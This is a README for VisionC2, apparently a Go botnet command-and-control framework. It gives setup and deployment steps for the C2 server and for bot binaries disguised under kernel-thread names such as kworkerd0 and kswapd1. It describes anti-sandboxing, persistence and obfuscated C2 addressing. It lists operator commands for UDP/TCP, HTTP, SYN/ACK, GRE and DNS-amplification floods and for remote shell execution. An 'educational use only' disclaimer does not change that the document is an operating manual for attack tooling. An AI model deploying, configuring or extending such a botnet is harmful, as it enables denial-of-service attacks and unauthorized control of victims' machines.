
---

# VisionC2

### Botnet Command & Control (C2) Framework

![VisionC2 Banner](https://img.shields.io/badge/VisioNNet-V3-red)
![Go Version](https://img.shields.io/badge/Go-1.21+-blue)
![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows%20%7C%20macOS-green)

**VisionC2** is a Go-based Command & Control (C2) framework designed for security research and educational purposes.
It features TLS-encrypted communications, multi-architecture support, and centralized bot management.

---

## ⚡ Features

### C2 Server

* **TLS Encryption** – Secure bot-to-server communications
* **Multi-User Support** – Role-based authentication
* **Bot Management** – Real-time monitoring and control
* **Attack Coordination** – Centralized command execution
* **Persistence Handling** – Automatic bot reconnection and tracking

### Bot Client

* **Multi-Architecture Support** – 14 supported CPU architectures
* **Anti-Sandboxing** – Multi-stage sandbox detection
* **Persistence Mechanisms** – Multiple survival techniques
* **Stealth Communication** – Obfuscated C2 addressing
* **Attack Capabilities**:

  * UDP / TCP Flood
  * HTTP Flood
  * SYN / ACK Flood
  * DNS Amplification
  * GRE Flood

### Security

* **Mutual Authentication** – Challenge–response validation
* **TLS 1.2 / 1.3 Support**
* **Connection Validation** – Bot identity verification
* **Dead Bot Cleanup** – Automatic pruning of inactive clients

---

## 🔧 Prerequisites

### System Requirements

* **Go 1.21+** (build from source)
* **UPX** – Binary compression
* **OpenSSL** – Certificate generation
* **NoMoreUPX** (recommended) – UPX string removal

  * [https://github.com/Syn2Much/upx-stripper](https://github.com/Syn2Much/upx-stripper)

### Dependency Installation

#### Ubuntu / Debian

```bash
sudo apt update
sudo apt install -y golang-go upx-ucl openssl git
```

#### CentOS / RHEL

```bash
sudo yum install -y golang upx openssl git
```

#### macOS

```bash
brew install go upx openssl
```

---

## 📜 TLS Certificate Generation

VisionC2 requires TLS certificates for secure communication.

### Option A: Self-Signed (Testing / Development)

```bash
openssl genrsa -out server.key 2048
openssl req -new -key server.key -out server.csr \
  -subj "/C=US/ST=State/L=City/O=Organization/CN=localhost"
openssl x509 -req -days 365 -in server.csr \
  -signkey server.key -out server.crt

chmod 600 server.key
chmod 644 server.crt
```

### Option B: Self-Signed with SAN

```bash
cat > openssl.cnf <<EOF
[req]
distinguished_name = req_distinguished_name
x509_extensions = v3_req
prompt = no

[req_distinguished_name]
C = US
ST = State
L = City
O = Organization
CN = localhost

[v3_req]
keyUsage = keyEncipherment, dataEncipherment
extendedKeyUsage = serverAuth
subjectAltName = @alt_names

[alt_names]
DNS.1 = localhost
IP.1  = 127.0.0.1
EOF

openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
  -keyout server.key -out server.crt \
  -config openssl.cnf -sha256

rm openssl.cnf
```

### Option C: Let’s Encrypt (Production)

```bash
sudo apt install certbot
sudo certbot certonly --standalone -d yourdomain.com
```

Certificates will be located at:

```
/etc/letsencrypt/live/yourdomain.com/
```

---

## 🚀 Quick Start

### 1. Clone the Repository

```bash
git clone https://github.com/yourusername/VisionC2.git
cd VisionC2
```

### 2. Configure the C2 Server

Edit `cnc/main.go`:

```go
const (
    USER_SERVER_IP   = "YOUR_SERVER_IP"
    BOT_SERVER_IP    = "YOUR_SERVER_IP"
    USER_SERVER_PORT = "420"
    BOT_SERVER_PORT  = "443"
)
```

Update authentication values:

```go
const (
    MAGIC_CODE       = "CHANGE_ME"
    PROTOCOL_VERSION = "v1.0"
)
```

### 3. Configure the Bot

Edit `bot/main.go`:

```go
const gothTits = "OBFUSCATED_C2_STRING"
```

Generate the obfuscated address:

```bash
python3 tools/obfuscate_c2.py "YOUR_C2_IP:443"
```

Replace both `gothTits` and `requestMore()` accordingly.

### 4. Build Bot Binaries

```bash
cd bot
chmod +x build.sh
./build.sh
```

### 5. Run the C2 Server

```bash
cd cnc
go run .
```

A default `users.json` file will be generated automatically.

### 6. Connect to Admin Interface

```bash
nc YOUR_SERVER_IP 420
# or
telnet YOUR_SERVER_IP 420
```

---

## 🛠️ Administration Commands

### Bot Management

```
bots
!info
!persist
!reinstall
!lolnogtfo
```

### Attack Commands

```
!udpflood <ip> <port> <time>
!tcpflood <ip> <port> <time>
!http <ip> <port> <time>
!syn <ip> <port> <time>
!ack <ip> <port> <time>
!gre <ip> <port> <time>
!dns <ip> <port> <time>
```

### Shell & System

```
!shell <cmd>
!stream <cmd>
!detach <cmd>
clear | cls
help | ?
ongoing
logout | exit
```

---

## 📊 Supported Architectures

| Binary      | Architecture | GOOS  | GOARCH   |
| ----------- | ------------ | ----- | -------- |
| kworkerd0   | x86 (32-bit) | linux | 386      |
| ethd0       | x86_64       | linux | amd64    |
| mdsync1     | ARMv7        | linux | arm      |
| ksnapd0     | ARMv5        | linux | arm      |
| kswapd1     | ARMv6        | linux | arm      |
| ip6addrd    | ARM64        | linux | arm64    |
| deferwqd    | MIPS         | linux | mips     |
| devfreqd0   | MIPSLE       | linux | mipsle   |
| kintegrity0 | MIPS64       | linux | mips64   |
| biosd0      | MIPS64LE     | linux | mips64le |
| kpsmoused0  | PPC64        | linux | ppc64    |
| ttmswapd    | PPC64LE      | linux | ppc64le  |
| vredisd0    | s390x        | linux | s390x    |
| kvmirqd     | RISC-V 64    | linux | riscv64  |

---

## 📁 Project Structure

```
VisionC2/
├── bot/
│   ├── bins/
│   ├── build.sh
│   └── main.go
├── cnc/
│   ├── main.go
│   ├── miscellaneous.go
│   └── users.json
└── tools/
    └── obfuscate_c2.py
```

---

## ⚖️ Legal & Ethical Use

This project is intended **strictly for educational and authorized security research**.

You agree to:

1. Obtain explicit permission before testing
2. Comply with all applicable laws
3. Accept full responsibility for usage
4. Avoid malicious or unauthorized deployment

---

## ⚠️ Disclaimer

**Educational use only.**
Unauthorized access to systems is illegal and unethical.
The author assumes no liability for misuse.

---

## 📧 Contact

**[dev@sinners.city](mailto:dev@sinners.city)**

---


